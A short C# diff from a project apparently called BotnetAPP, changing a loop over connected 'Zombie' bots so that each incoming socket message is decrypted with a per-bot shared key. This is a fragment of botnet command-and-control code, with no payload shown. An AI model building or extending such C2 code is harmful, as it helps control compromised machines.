@@ -141,6 +141,7 @@ namespace BotnetAPP.Network
         private string GetIncomingMessage(Socket s)
         {
             byte[] rawMessage = new byte[8192];
+            
             string resultat = "";
             int k = s.Receive(rawMessage);
             for (int i = 0; i < k; i++)
@@ -213,7 +214,7 @@ namespace BotnetAPP.Network
 
                     foreach (KeyValuePair<Zombie, Socket> item in bot.ToArray())
                     {
-                        string message = GetIncomingMessage(item.Value);
+                        string message = Encryption.Decrypt(GetIncomingMessage(item.Value), item.Key.SharedSymKey);
 
                         if (message != "")
                         {
